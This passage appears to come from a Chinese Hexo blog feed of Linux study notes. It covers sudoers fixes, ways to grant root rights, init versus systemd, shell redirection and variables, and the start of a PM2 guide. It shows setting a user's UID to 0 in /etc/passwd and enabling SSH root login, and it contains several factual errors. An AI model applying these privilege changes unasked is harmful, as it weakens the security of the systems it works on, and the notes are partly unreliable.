class="code"><pre><span class="line">$ sudo apt-get install vim</span><br></pre></td></tr></table></figure><p>不出意外，你肯定会得到这样一个错误：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[sudo] password for boo:</span><br><span class="line">boo is not in the sudoers file.  This incident will be reported.</span><br></pre></td></tr></table></figure><p>这个错误的意思是说该用户并不在 sudoers 文件中，那么该如何解决呢？</p><p>使用如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ sudo visudo</span><br><span class="line"></span><br><span class="line"># Members of the admin group may gain root privileges</span><br><span class="line">%admin ALL&#x3D;(ALL) ALL</span><br><span class="line"></span><br><span class="line"># 找到该注释，在其下增加一行 </span><br><span class="line">%yourusername ALL&#x3D;(ALL) ALL</span><br></pre></td></tr></table></figure><p>然后保存退出，就会发现可以使用 sudo 提权了。</p><h3 id="赋予-root-权限"><a href="#赋予-root-权限" class="headerlink" title="赋予 root 权限"></a>赋予 root 权限</h3><p>这里有三种方式，先来看看最简单的方式：</p><p>方式一：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ sudo vim &#x2F;etc&#x2F;passwd</span><br><span class="line"></span><br><span class="line"># 将用户id 改为 0</span><br><span class="line">testuser1:x:0:1001::&#x2F;home&#x2F;testuser1:&#x2F;bin&#x2F;sh</span><br></pre></td></tr></table></figure><p>需要注意的是：</p><ol><li>该方法适用于普通用户以及管理员用户</li><li>使用 testuser1 账户登录后，直接获取的就是 root 帐号的权限。</li></ol><p>方式二：（这里以ubuntu 系统为例）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ sudo visudo # sudo vim &#x2F;etc&#x2F;sudoers</span><br><span class="line"></span><br><span class="line">#  Allow members of group sudo to execute any command</span><br><span class="line">%sudo   ALL&#x3D;(ALL:ALL) ALL</span><br><span class="line"></span><br><span class="line"># 在其后面增加一行</span><br><span class="line">%wheel ALL&#x3D;(ALL:ALL) ALL</span><br></pre></td></tr></table></figure><p>然后修改该用户，使其属于 root 组（wheel）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ usermod -g root boo</span><br></pre></td></tr></table></figure><p>修改完成之后，使用boo 用户登入，执行命令：<code>su -</code>，输入 root 账户的密码，即可获得root 权限。</p><p>方式三：（这里以ubuntu 为例）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ sudo visudo # sudo vim &#x2F;etc&#x2F;sudoers</span><br><span class="line"></span><br><span class="line"># User privilege specification</span><br><span class="line">root    ALL&#x3D;(ALL:ALL) ALL</span><br><span class="line">boo ALL&#x3D;(ALL:ALL) ALL</span><br></pre></td></tr></table></figure><p>修改完成之后，使用boo 用户登入，执行命令：<code>su -</code>，输入 root 账户的密码，即可获得root 权限。</p><p>方式二、方式三和方式一的区别就是：前者需要知道root 账户的密码，而后者可以直接以普通用户的身份或者管理员身份获取root 权限。</p><p>另外还有一个需要注意的地方就是：使用第一种方式获取 root 权限，其实也有弊端，弊端就是 <del>远程使用该用户登入时，还是需要输入 root 密码，才能验证身份成功，是的 必须输入 root 用户的密码。</del></p><p>事实证明，并非上面所述，ssh 连接时的确需要输入密码验证，但不是 root 用户的密码，之前之所以一直看到 <code>Permission denied, please try again.</code>这样的错误，只是因为 没有开启允许 root 用户远程登入的权限。如何开启，见下文扩展补充。</p><h3 id="扩展补充"><a href="#扩展补充" class="headerlink" title="扩展补充"></a>扩展补充</h3><h4 id="在Ubuntu中如何修改-root-密码"><a href="#在Ubuntu中如何修改-root-密码" class="headerlink" title="在Ubuntu中如何修改 root 密码"></a>在Ubuntu中如何修改 root 密码</h4><p>默认情况下，出于安全原因，root用户帐户密码在Ubuntu Linux 中被锁定。因此，无法使用root用户登录或使用诸如<code>su -</code>之类的命令成为超级用户。</p><p>但可以借助其他方式，使用<code>passwd</code>命令来修改。因为普通用户只能更改其帐户的密码。超级用户（root）可以更改任何用户帐户的密码（包括它自己）。</p><p>使用以下命令成为 root用户：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo -i</span><br><span class="line">$ passwd root</span><br></pre></td></tr></table></figure><p>如果在sudo 命令使用不了的情况下，可以进入单用户模式，再进行修改</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ passwd root</span><br></pre></td></tr></table></figure><h4 id="在Ubuntu中如何远程-root-登入"><a href="#在Ubuntu中如何远程-root-登入" class="headerlink" title="在Ubuntu中如何远程 root 登入"></a>在Ubuntu中如何远程 root 登入</h4><p>在Ubuntu中，默认是不能使用 root 账户登入到系统的，如果一定想要用 root账户登入，可以编辑 sshd 配置，执行如下操作：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ sudo vim &#x2F;etc&#x2F;ssh&#x2F;sshd_config</span><br><span class="line"></span><br><span class="line"># PermitRootLogin prohibit-password</span><br><span class="line"># 修改为：</span><br><span class="line"># PermitRootLogin yes</span><br><span class="line"></span><br><span class="line"># 重启sshd 服务</span><br><span class="line">$ sudo systemctl restart sshd</span><br></pre></td></tr></table></figure><h4 id=""><a href="#" class="headerlink" title=""></a></h4><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://blog.csdn.net/li_101357/article/details/46778827" target="_blank" rel="noopener">adduser 和 useradd 的区别</a></li><li><a href="https://www.cnblogs.com/noway-neway/p/5235300.html" target="_blank" rel="noopener">Ubuntu 如何进入单用户模式</a></li><li><a href="https://raspberrypi.stackexchange.com/questions/48056/how-to-login-as-root-remotely" target="_blank" rel="noopener">ssh-如何远程以root 登入</a></li><li><a href="https://www.cyberciti.biz/faq/change-root-password-ubuntu-linux/" target="_blank" rel="noopener">如何在Ubuntu Linux 中更改 root 密码</a></li><li><a href="https://www.cyberciti.biz/faq/become-superuser-on-ubuntu-linux/" target="_blank" rel="noopener">如何使用su / sudo成为Ubuntu Linux的超级用户？</a></li><li><a href="https://www.cyberciti.biz/faq/ubuntu-linux-root-password-default-password/" target="_blank" rel="noopener">Ubuntu Linux root 用户默认密码</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux init、service、systemctl 这三者之间的区别</title>
      <link href="/the-difference-between-linux-init-service-systemctl/"/>
      <url>/the-difference-between-linux-init-service-systemctl/</url>
      
        <content type="html"><![CDATA[<p>在接触到Linux 的服务之后，我所知道的管理服务的方式有三种，分别是<code>init</code>、<code>service</code>、<code>systemctl</code>。</p><p>至于这三者之间的区别不得而知，所以整理这片笔记的目的就是了解这三者之间的区别。</p><a id="more"></a><h2 id="init"><a href="#init" class="headerlink" title="init"></a>init</h2><p>历史上，Linux 的启动一直采用init 进程。</p><p>在类Unix 的计算机操作系统中，Init（初始化的简称）是在启动计算机系统期间启动的第一个进程。</p><p>Init 是一个守护进程，它将持续运行，直到系统关闭。它是所有其他进程的直接或间接的父进程。</p><p>因为init 的参数全在<code>/etc/init.d</code>目录下，所以使用 init 启动一个服务，应该这样做：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo &#x2F;etc&#x2F;init.d&#x2F;nginx start</span><br></pre></td></tr></table></figure><h2 id="service"><a href="#service" class="headerlink" title="service"></a>service</h2><p>通过查看man 手册页可以得知，service是一个运行<code>System V init</code>的脚本命令。</p><blockquote><p>那么什么是 System V init 呢？</p></blockquote><p>也就是<code>/etc/init.d</code> 目录下的参数。</p><p>所以分析可知service 是去<code>/etc/init.d</code>目录下执行相关程序，服务配置文件的存放目录就是<code>/etc/init.d</code>.</p><p>使用 service 启动一个服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ service nginx start</span><br></pre></td></tr></table></figure><p>可以理解成 service 就是<code>init.d</code> 的一种实现方式。<br>所以这两者启动方式（或者是停止、重启）并没有什么区别。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ sudo &#x2F;etc&#x2F;init.d&#x2F;nginx start</span><br><span class="line">&#x2F;&#x2F; 等价于</span><br><span class="line">$ service nginx start</span><br></pre></td></tr></table></figure><p>但是这两种方式均有如下缺点：</p><ol><li>启动时间长。init 进程是串行启动，只有前一个进程启动完，才会启动下一个进程。</li><li>启动脚本复杂。init进程只是执行启动脚本，不管其他事情。脚本需要自己处理各种情况，这往往使得脚本变得很长。</li></ol><h2 id="systemd"><a href="#systemd" class="headerlink" title="systemd"></a>systemd</h2><p>Systemd 就是为了解决这些问题而诞生的。它包括 System and Service Manager，为系统的启动和管理提供一套完整的解决方案。<br>Systemd 是Linux 系统中最新的初始化系统（init），它主要的设计目的是克服 <code>System V init</code>固有的缺点，提高系统的启动速度。</p><p>根据 Linux 惯例，字母d是守护进程（daemon）的缩写。 Systemd 这个名字的含义，就是它要守护整个系统。</p><p>使用了 Systemd，就不需要再用init 了。Systemd 取代了initd（Initd 的PID 是0） ，成为系统的第一个进程（Systemd 的PID 等于 1），其他进程都是它的子进程。</p><p>Systemd 的优点是功能强大，使用方便，缺点是体系庞大，非常复杂。</p><p>查看Systemd 的版本信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ systemctl --version</span><br></pre></td></tr></table></figure><h3 id="系统管理"><a href="#系统管理" class="headerlink" title="系统管理"></a>系统管理</h3><p><strong>Systemd 并不是一个命令，而是一组命令</strong>，涉及到系统管理的方方面面。</p><h4 id="systemctl"><a href="#systemctl" class="headerlink" title="systemctl"></a>systemctl</h4><p>systemctl是 Systemd 的主命令，用于管理系统。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 重启系统</span><br><span class="line">$ sudo systemctl reboot</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 启动进入救援状态（单用户状态）</span><br><span class="line">$ sudo systemctl rescue</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 管理服务</span><br><span class="line">$ sudo systemctl start nginx</span><br></pre></td></tr></table></figure><h4 id="hostnamectl"><a href="#hostnamectl" class="headerlink" title="hostnamectl"></a>hostnamectl</h4><p>hostnamectl命令用于查看当前主机的信息。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 显示当前主机信息</span><br><span class="line">$ hostnamectl</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 设置主机名</span><br><span class="line">$ sudo hostnamectl set-hostname BoodeUbuntu</span><br></pre></td></tr></table></figure><h4 id="localectl"><a href="#localectl" class="headerlink" title="localectl"></a>localectl</h4><p>localectl命令用于查看本地化设置。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 查看本地化设置</span><br><span class="line">$ localectl</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 设置本地化参数。</span><br><span class="line">$ sudo localectl set-locale LANG&#x3D;en_GB.utf8</span><br><span class="line">$ sudo localectl set-keymap en_GB</span><br></pre></td></tr></table></figure><h4 id="timedatectl"><a href="#timedatectl" class="headerlink" title="timedatectl"></a>timedatectl</h4><p>timedatectl命令用于查看当前时区设置。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 查看当前时区设置</span><br><span class="line">$ timedatectl</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 显示所有可用的时区</span><br><span class="line">$ timedatectl list-timezones                                                                                   </span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 设置当前时区</span><br><span class="line">$ sudo timedatectl set-timezone America&#x2F;New_York</span><br><span class="line">$ sudo timedatectl set-time YYYY-MM-DD</span><br><span class="line">$ sudo timedatectl set-time HH:MM:SS</span><br></pre></td></tr></table></figure><p>总结一下，<code>init</code> 是最初的进程管理方式，<code>service</code> 是<code>init</code> 的另一种实现，而 <code>systemd</code> 则是一种取代 <code>initd</code> 的解决方案，其中 <code>systemctl</code> 是 <code>systemd</code> 的主命令，用于管理系统以及服务。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://en.wikipedia.org/wiki/Init" target="_blank" rel="noopener">Linux Init - 维基百科</a></li><li><a href="http://www.ruanyifeng.com/blog/2016/03/systemd-tutorial-commands.html" target="_blank" rel="noopener">Systemd 入门教程 - 阮一峰的网络日志</a></li><li><a href="https://blog.csdn.net/lineuman/article/details/52578399" target="_blank" rel="noopener">init、service、systemctl 的区别</a></li><li><a href="http://www.ruanyifeng.com/blog/2016/02/linux-daemon.html" target="_blank" rel="noopener">Linux 守护进程的启动方式</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>了解 Linux的管道符、重定向、环境变量</title>
      <link href="/understand-linux-pipe-symbols-redirects-environment-variables/"/>
      <url>/understand-linux-pipe-symbols-redirects-environment-variables/</url>
      
        <content type="html"><![CDATA[<p>这篇文章浅谈一下 Linux 的管道符、重定向和环境变量。</p><a id="more"></a><h3 id="输入输出重定向"><a href="#输入输出重定向" class="headerlink" title="输入输出重定向"></a>输入输出重定向</h3><p>在了解什么是输入输出重定向之前，我们先要搞清楚以下两种输出信息的区别：</p><ul><li>标准输出信息：<br>包括该文件的一些相关权限、所有者、所属组、文件大小及修改时间等信息。</li><li>错误输出信息：<br>Bash终端显示的报错提示信息<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[max@localhost 桌面]$ ls</span><br><span class="line">testdir   test.txt</span><br><span class="line">[max@localhost 桌面]$ cat test.txt</span><br><span class="line">Hello Linux!                        # 标准输出信息</span><br><span class="line">[max@localhost 桌面]$ cat xxx</span><br><span class="line">cat: xxx: 没有那个文件或目录        # 错误输出信息 因为不存在xxx文件</span><br></pre></td></tr></table></figure></li><li>标准输入重定向（STDIN，文件描述符为0）：默认从键盘输入，也可从其他文件或命令中输入。</li><li>标准输出重定向（STDOUT，文件描述符为1）：默认输出到屏幕。</li><li>错误输出重定向（STDERR，文件描述符为2）：默认输出到屏幕。</li></ul><p>之所以花这么大力气，理解这个概念，是因为待会有个很重要的知识点要用到这个概念。</p><h3 id="输出重定向"><a href="#输出重定向" class="headerlink" title="输出重定向"></a>输出重定向</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">命令 &gt; 文件        将标准输出重定向到一个文件中（清空原有文件的数据）</span><br><span class="line">命令 2&gt; 文件    将错误输出重定向到一个文件中（清空原有文件的数据）</span><br><span class="line">命令 &gt;&gt; 文件    将标准输出重定向到一个文件中（追加到原有内容的后面）</span><br><span class="line">命令 2&gt;&gt; 文件   将错误输出重定向到一个文件中（追加到原有内容的后面）</span><br><span class="line">命令 &gt;&gt; 文件 2&gt;&amp;1 或</span><br><span class="line">命令 &amp;&gt;&gt; 文件将标准输出与错误输出共同写入到文件中（追加到原有内容的后面）</span><br></pre></td></tr></table></figure><p>实例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[max@localhost 桌面]$ cat test.txt</span><br><span class="line">Hello Linux!</span><br><span class="line">[max@localhost 桌面]$ echo &quot;测试输出重定向(追加模式)&quot; &gt;&gt; test.txt</span><br><span class="line">[max@localhost 桌面]$ cat test.txt </span><br><span class="line">Hello Linux!</span><br><span class="line">测试输出重定向(追加模式)</span><br><span class="line"></span><br><span class="line">[max@localhost 桌面]$ echo &quot;测试输出重定向(清除模式)&quot; &gt; test.txt</span><br><span class="line">[max@localhost 桌面]$ cat test.txt</span><br><span class="line">测试输出重定向(清除模式)</span><br></pre></td></tr></table></figure><h3 id="输入重定向"><a href="#输入重定向" class="headerlink" title="输入重定向"></a>输入重定向</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">命令 &lt; 文件将文件作为命令的标准输入</span><br><span class="line">命令 &lt;&lt; 分界符从标准输入中读入，直到遇见分界符才停止</span><br><span class="line">命令 &lt; 文件1 &gt; 文件2将文件1作为命令的标准输入并将标准输出到文件2</span><br></pre></td></tr></table></figure><p>输入重定向相对于输出重定向较使用的少一些，可以理解为：<strong>输入重定向的作用是把文件直接导入到命令中</strong>。<br>例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 将文件text.txt导入给 &#96;wc -l&#96;命令，统计行数。</span><br><span class="line">[max@localhost 桌面]$ wc -l &lt; test.txt</span><br><span class="line">1</span><br></pre></td></tr></table></figure><h3 id="管道符"><a href="#管道符" class="headerlink" title="管道符"></a>管道符</h3><p>管道符的概念就是：把前一个命令原本要输出到屏幕的标准正常数据当作是后一个命令的标准输入。</p><p>举个例子，把<code>etc</code>目录下的所有文件的属性信息，作为标准输入传递给 <code>more</code>命令。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[max@localhost 桌面]$ ls -l &#x2F;etc&#x2F; | more</span><br><span class="line">总用量 1396</span><br><span class="line">drwxr-xr-x.  3 root root       97 8月  24 04:35 abrt</span><br><span class="line">-rw-r--r--.  1 root root       16 8月  24 04:43 adjtime</span><br><span class="line">-rw-r--r--.  1 root root    21929 1月  29 2014 brltty.conf</span><br><span class="line">drwxr-xr-x.  2 root root        6 1月  29 2014 chkconfig.d</span><br><span class="line">-rw-r--r--.  1 root root     1157 2月   6 2014 chrony.conf</span><br><span class="line">--More--</span><br></pre></td></tr></table></figure><h3 id="命令行中的通配符"><a href="#命令行中的通配符" class="headerlink" title="命令行中的通配符"></a>命令行中的通配符</h3><ul><li>星号（*）代表匹配零个或多个字符</li><li>问号（?）代表匹配单个字符</li><li>中括号内加上数字[0-9]代表匹配0～9之间的单个数字的字符</li><li>而中括号内加上字母[abc]则是代表匹配a、b、c三个字符中的任意一个字符<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[max@localhost test]$ ls</span><br><span class="line">file1  file2  file3  file99  filex</span><br><span class="line">[max@localhost test]$ ls -l file?</span><br><span class="line">-rw-rw-r--. 1 max max 0 10月 10 22:49 file1</span><br><span class="line">-rw-rw-r--. 1 max max 0 10月 10 22:49 file2</span><br><span class="line">-rw-rw-r--. 1 max max 0 10月 10 22:49 file3</span><br><span class="line">-rw-rw-r--. 1 max max 0 10月 10 22:49 filex</span><br><span class="line">[max@localhost test]$ ls -l file*</span><br><span class="line">-rw-rw-r--. 1 max max 0 10月 10 22:49 file1</span><br><span class="line">-rw-rw-r--. 1 max max 0 10月 10 22:49 file2</span><br><span class="line">-rw-rw-r--. 1 max max 0 10月 10 22:49 file3</span><br><span class="line">-rw-rw-r--. 1 max max 0 10月 10 22:49 file99</span><br><span class="line">-rw-rw-r--. 1 max max 0 10月 10 22:49 filex</span><br><span class="line">[max@localhost test]$ ls -l file[1-2]</span><br><span class="line">-rw-rw-r--. 1 max max 0 10月 10 22:49 file1</span><br><span class="line">-rw-rw-r--. 1 max max 0 10月 10 22:49 file2</span><br><span class="line">[max@localhost test]$ ls -l file[x]</span><br><span class="line">-rw-rw-r--. 1 max max 0 10月 10 22:49 filex</span><br></pre></td></tr></table></figure><h3 id="常用的转义字符"><a href="#常用的转义字符" class="headerlink" title="常用的转义字符"></a>常用的转义字符</h3><blockquote><p>反斜杠（\）：使反斜杠后面的一个变量变为单纯的字符串。</p><p>单引号（’’）：转义其中所有的变量为单纯的字符串。</p><p>双引号（””）：保留其中的变量属性，不进行转义处理。</p><p>反引号（``）：把其中的命令执行后返回结果。</p></blockquote></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[max@localhost test]$ PRICE&#x3D;5</span><br><span class="line">[max@localhost test]$ echo &quot;The price of this shirt is $PRICE&quot;</span><br><span class="line">The price of this shirt is 5</span><br></pre></td></tr></table></figure><p>上面的输出看上去挺对的，但是并不完美，我们希望能够输出“The price of this shirt is $5”，于是我们试着这样写：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[max@localhost test]$ echo &quot;The price of this shirt is $$PRICE&quot;</span><br><span class="line">The price of this shirt is 9944PRICE</span><br></pre></td></tr></table></figure><p>不幸的是美元符号和变量提取符号合并后<code>$$</code>作用是显示当前程序的进程ID。</p><p>要想让第一个<code>$</code>乖乖地作为美元符号，那么就需要使用反斜杠<code>\</code>来进行转义，将这个命令提取符转义成单纯的文本，去除其特殊功能。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[max@localhost test]$ echo &quot;The price of this shirt is \$$PRICE&quot;</span><br><span class="line">The price of this shirt is $5</span><br></pre></td></tr></table></figure><p>如果只需要某个命令的输出值时，可以像<code>命令</code>这样，将命令用反引号括起来，达到预期的效果.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[max@localhost test]$ echo &#96;uname -a&#96; &gt;&gt; file1</span><br><span class="line">[max@localhost test]$ cat file1</span><br><span class="line">Linux localhost.localdomain 3.10.0-123.el7.x86_64 #1 SMP Mon May 5 11:16:57 EDT 2014 x86_64 x86_64 x86_64 GNU&#x2F;Linux</span><br></pre></td></tr></table></figure><blockquote><p>思考：如何将普通变量转换为全局变量？</p></blockquote><p>使用命令：<code>export [变量名称]</code>，需要在拥有管理员权限时才能正常使用。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost home]# WORKDIR&#x3D;&#x2F;home&#x2F;workdir</span><br><span class="line">[root@localhost home]# mkdir $WORKDIR </span><br><span class="line">[root@localhost home]# cd $WORKDIR</span><br><span class="line">[root@localhost workdir]# pwd</span><br><span class="line">&#x2F;home&#x2F;workdir</span><br><span class="line">[root@localhost workdir]# exit</span><br><span class="line">exit</span><br><span class="line">[max@localhost home]$ cd $WORKDIR</span><br><span class="line">[max@localhost ~]$ echo $WORKDIR</span><br><span class="line">[max@localhost ~]$ su root</span><br><span class="line">密码：</span><br><span class="line">[root@localhost max]# export WORKDIR</span><br><span class="line">[root@localhost &#x2F;]# su max</span><br><span class="line">[max@localhost &#x2F;]$ cd $WORKDIR</span><br><span class="line">[max@localhost workdir]$ pwd</span><br><span class="line">&#x2F;home&#x2F;workdir</span><br></pre></td></tr></table></figure><h4 id="重点一："><a href="#重点一：" class="headerlink" title="重点一："></a>重点一：</h4><p>在上面的命令中有一个很重要的知识点：</p><blockquote><p>关于如何在Linux中创建一个变量的问题？有两个地方需要注意。</p></blockquote><ol><li>所有字母都需要大写</li><li>变量与赋值符号(=)之间不能存在空格</li><li>无论是系统环境变量还是自定义变量还是全局变量，在调用时 都需要使用<code>$</code>符号来标识。</li></ol><h4 id="重点二"><a href="#重点二" class="headerlink" title="重点二"></a>重点二</h4><ul><li>在Linux 系统中当普通用户身份时命令提示符的前缀标识是：<code>$</code>。</li><li>在Linux 系统中当为管理员身份时命令提示符的前缀标识是：<code>#</code>。</li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PM2 快速上手</title>
      <link href="/pm2-quick-start/"/>
      <url>/pm2-quick-start/</url>
      
        <content type="html"><![CDATA[<p><a href="http://pm2.keymetrics.io/" target="_blank" rel="noopener">PM2</a> 是Node.js 生产环境中的进程管理工具，自带负载均衡功能。</p><a id="more"></a><p>安装</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm install pm2 -g</span><br></pre></td></tr></table></figure><p>无缝更新</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pm2 update</span><br></pre></td></tr></table></figure><h2 id="启动应用"><a href="#启动应用" class="headerlink" title="启动应用"></a>启动应用</h2><p>PM2 中有两种方式启动应用，一种是<strong>直接调用应用入口文件</strong>，一种是<strong>通过调用配置文件启动应用</strong>。</p><h3 id="命令行启动"><a href="#命令行启动" class="headerlink" title="命令行启动"></a>命令行启动</h3><p>在生产环境中，通过命令行启动服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pm2 stat app.js</span><br></pre></td></tr></table></figure><h3 id="配置文件启动"><a href="#配置文件启动" class="headerlink" title="配置文件启动"></a>配置文件启动</h3><p>很多时候，仅仅只是使用 <code>PM2</code> 去启动应用，可能不能完全满足我们的需求。</p><p>当需要对应用有更多的要求时，这个时候就需要用到<code>PM2</code> 的配置文件了。</p><p>PM2 支持通过配置文件创建管理应用，首先在项目根目录手动创建配置文件<code>precesses.json</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;apps&quot;: [</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;name&quot;: &quot;myApp&quot;,</span><br><span class="line">      &quot;cwd&quot;: &quot;&#x2F;var&#x2F;www&#x2F;app&#x2F;&quot;,</span><br><span class="line">      &quot;script&quot;: &quot;.&#x2F;app.js&quot;,</span><br><span class="line">      &quot;watch&quot;: true</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>或者直接使用 <code>pm2 init</code> 命令，自动创建默认的<code>ecosystem.config.js</code>配置文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 